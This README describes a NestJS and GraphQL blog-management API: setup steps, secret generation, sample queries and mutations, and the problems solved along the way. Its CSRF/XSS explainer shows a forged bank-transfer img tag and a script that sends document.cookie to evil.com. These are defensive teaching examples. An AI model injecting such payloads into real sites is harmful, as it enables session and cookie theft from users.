    # Blog Management API

    A secure, production-ready NestJS + GraphQL API for managing users, posts, and tags with user profiles.

    ---

    ## 🚀 Project Overview
    - **Backend:** NestJS (TypeScript)
    - **API:** GraphQL
    - **Database:** MySQL (TypeORM, easily switchable to PostgreSQL)
    - **Authentication:** JWT (access & refresh tokens)
    - **Security:** CSRF protection, secure cookies, password hashing
    - **Validation:** class-validator (request data validation)
    - **Architecture:** CQRS (Command/Query separation)

    ---

    ## 🗂️ Project Structure

    ```
    src/
    ├── auth/                # Auth & JWT logic
    ├── users/               # User management (User, UserProfile)
    ├── posts/               # Blog posts
    ├── tags/                # Post tags
    ├── database/
    │   ├── migrations/      # All migration files (MySQL)
    │   └── schema/          # Database schema definitions
    ├── config/              # App & security config (e.g., security.config)
    └── middleware/          # Custom middleware (e.g., csrf.middleware)
    ```

    ## 🛡️ CSRF & XSS Protection (How We Prevent Attacks)

    > **What are CSRF and XSS?**  
    > - **CSRF (Cross-Site Request Forgery):** Pretends to be you and sends fake requests by tricking your browser into using your credentials.
    > - **XSS (Cross-Site Scripting):** Runs scripts in your browser by injecting malicious JavaScript into trusted pages.

    ---

    ### 🧨 What is CSRF (Cross-Site Request Forgery)?

    **Goal:** Make your browser send fake, unwanted requests as if you did them.

    **How it works:**  
    - You're logged into a site (like your bank).  
    - An attacker tricks your browser (via a malicious site) into sending a request to the bank using your session cookie.  
    - Example:  
      ```html
      <img src="https://bank.com/transfer?amount=10000&to=hacker" />
      ```
    - Your browser sends the request with your credentials. The bank thinks you approved it.

    **Key points:**  
    - Attacker can't see the response, but can perform actions as you.
    - Needs you to be logged in.

    ---

    ### 🧨 What is XSS (Cross-Site Scripting)?

    **Goal:** Run malicious scripts in your browser to steal data or hijack your session.

    **How it works:**  
    - A website displays user content (like comments) without sanitizing it.
    - Attacker posts:
      ```html
      <script>
        fetch("https://evil.com/steal?cookie=" + document.cookie);
      </script>
      ```
    - When others view the comment, the script runs and sends their cookies to the attacker.

    **Key points:**  
    - Lets attackers run any code in your browser.
    - Can steal cookies, session tokens, or perform actions as you.

    ---

    ### ✅ Key Differences

    | Feature         | CSRF                                   | XSS                                 |
    |-----------------|----------------------------------------|-------------------------------------|
    | Uses cookies?   | ✅ Yes (needs your session)             | ❌ Not required, but can steal them  |
    | Needs login?    | ✅ Yes                                  | ❌ No, but often targets logged-in   |
    | How?            | Tricks browser to send request          | Injects & runs JavaScript           |
    | Risk?           | Performs actions as you                 | Runs code in your browser           |

    ---

    ### 🛡 How We Prevent Attacks

    #### CSRF Protection
    - Sensitive requests (like mutations) must include a valid CSRF token.
    - Backend checks the token using custom middleware (`src/middleware/csrf.middleware.ts`).
    - If the token is missing or invalid, the request is blocked.
    - Safe requests (like login/register or GETs) are allowed through.
    - **Tip:** We use SameSite cookies and custom headers to help block CSRF.

    #### XSS Protection
    - All user input is validated and sanitized before saving to the database.
    - Sensitive cookies use `httpOnly` and `SameSite=strict` so JavaScript can't access them.
    - User content should be escaped before showing it on the frontend.
    - **Tip:** Avoid using `innerHTML` and use frameworks like React that escape content by default.

    ---

    ---

    ## ⚡ Setup Instructions

    1. **Install dependencies**
      ```bash
      npm install
      ```

    2. **Configure environment**
      - Copy the example environment file:
        ```bash
        cp .env.example .env
        ```
      - Open `.env` in your editor and fill in your database and secret keys:
        - `DB_HOST`, `DB_PORT`, `DB_USERNAME`, `DB_PASSWORD`, `DB_DATABASE`
        - `JWT_SECRET` (see below for how to generate a strong secret)
        - `JWT_REFRESH_SECRET` (use a different value than `JWT_SECRET`)
        - `CSRF_SECRET` (any random string for CSRF protection)
        - `FRONTEND_URL` (your frontend's URL for CORS)

    3. **How to create strong secret keys for your .env**

      It's important to use long, random strings for your secrets. Here are two easy ways:

      - **Using OpenSSL (recommended):**
        ```bash
        openssl rand -hex 32
        ```
        This will print a secure 64-character string. Copy and paste it into your `.env` as the value for `JWT_SECRET`, `JWT_REFRESH_SECRET`, or `CSRF_SECRET`.

      - **Online generator:**
        Visit https://generate-random.org/ and generate a random string of at least 32 characters. Copy and use it in your `.env`.

      > **Tip:** Never share your secret keys or commit them to version control. Keep your `.env` file private.

    4. **Create the database**
      - Create a MySQL database named `BLOG` (or update `.env` for your DB name).

    5. **Run database migrations**
      ```bash
      npm run migration:run
      ```

    ---

    ## 🏃 How to Run the API Locally

    - **Development mode:**
      ```bash
      npm run start:dev
      ```
    - **Production mode:**
      ```bash
      npm run build
      npm run start:prod
      ```
    - **API Playground:**
      - Open [http://localhost:3000/graphql](http://localhost:3000/graphql) in your browser.

    ---

    ## 📝 Sample GraphQL Queries & Mutations

    ### Register User
    ```graphql
    mutation Register($username: String!, $email: String!, $password: String!) {
      register(input: { username: $username, email: $email, password: $password }) {
        id
        username
        email
        bio
      }
    }
    ```

    ### Login
    ```graphql
    mutation Login($email: String!, $password: String!) {
      login(input: { email: $email, password: $password }) {
        accessToken
        refreshToken
        user {
          id
          username
          email
          bio
        }
      }
    }
    ```

    ### Get Profile (with bio)
    ```graphql
    query GetProfile {
      profile {
        id
        username
        email
        bio
      }
    }
    ```

    ### Update Profile (including bio)
    ```graphql
    mutation UpdateProfile($username: String, $email: String, $password: String, $bio: String) {
      updateProfile(input: { 
        username: $username, 
        email: $email, 
        password: $password, 
        bio: $bio 
      }) {
        id
        username
        email
        bio
      }
    }
    ```

    ### Get All Posts
    ```graphql
    query GetPosts {
      posts {
        id
        title
        content
        author { 
          username 
          bio 
        }
        tags { name }
      }
    }
    ```

    ### Create Post
    ```graphql
    mutation CreatePost($title: String!, $content: String!, $tagIds: [Int!]!) {
      createPost(input: { title: $title, content: $content, tagIds: $tagIds }) {
        id
        title
        content
        author { username }
        tags { name }
      }
    }
    ```

    ### Update Post
    ```graphql
    mutation UpdatePost($id: Int!, $title: String!, $content: String!, $tagIds: [Int!]!) {
      updatePost(input: { id: $id, title: $title, content: $content, tagIds: $tagIds }) {
        id
        title
        content
        author { username }
        tags { name }
      }
    }
    ```

    ### Delete Post
    ```graphql
    mutation DeletePost($id: Int!) {
      deletePost(id: $id)
    }
    ```

    ### Get All Tags
    ```graphql
    query GetTags {
      tags {
        id
        name
      }
    }
    ```

    ### Create Tag
    ```graphql
    mutation CreateTag($name: String!) {
      createTag(input: { name: $name }) {
        id
        name
      }
    }
    ```

    ### Update Tag
    ```graphql
    mutation UpdateTag($id: Int!, $name: String!) {
      updateTag(input: { id: $id, name: $name }) {
        id
        name
      }
    }
    ```

    ### Delete Tag
    ```graphql
    mutation DeleteTag($id: Int!) {
      deleteTag(id: $id)
    }
    ```

    ---

    ## ⚠️ Known Issues & Challenges (and Solutions)

    - **Switching from REST to GraphQL:**
      - *Challenge:* GraphQL's single endpoint and query structure can be confusing at first.
      - *Solution:* First learned CRUD functions, then used GraphQL Playground, Postman, YouTube tutorials, and websites to practice and test. Followed best practices for resolver and CQRS structure.

    - **JWT Token Management:**
      - *Challenge:* Handling both access and refresh tokens securely.
      - *Solution:* Used separate secrets, HTTP-only cookies, and automatic token refresh.

    - **CSRF Protection:**
      - *Challenge:* Understanding and implementing CSRF in GraphQL.
      - *Solution:* Used token-based CSRF protection and middleware to validate tokens.

    - **Cookie Security:**
      - *Challenge:* Secure cookies for both dev and prod.
      - *Solution:* Used environment-based settings, SameSite, Secure flags, and domain restrictions.

    - **TypeORM Relationships:**
      - *Challenge:* Many-to-many setup for posts and tags, and one-to-one for user profiles.
      - *Solution:* Used join tables, cascade options, and string-based references to avoid circular dependencies.

    - **User Profile Implementation:**
      - *Challenge:* Implementing one-to-one relationship between User and UserProfile.
      - *Solution:* Created separate UserProfile entity with bio field, automatic profile creation during registration, and proper relationship loading.

    - **Environment Variables:**
      - *Challenge:* Managing secrets and config for different environments.
      - *Solution:* `.env` file with unique secrets for each component.

    - **Authentication Guard Integration:**
      - *Challenge:* JWT with GraphQL guards.
      - *Solution:* Custom GqlAuthGuard and CurrentUser decorator.

    - **CORS Configuration:**
      - *Challenge:* Allowing frontend communication securely.
      - *Solution:* Configured allowed origins and credentials in CORS settings.

    - **Migration Generation Issues:**
      - *Challenge:* Circular dependency errors during TypeORM migration generation.
      - *Solution:* Used string-based entity references and manually created migrations when needed.

    > All solutions are designed to be easy to understand and maintain.

    ---

    # I am very happy to share my learning result for the first time! 🎉
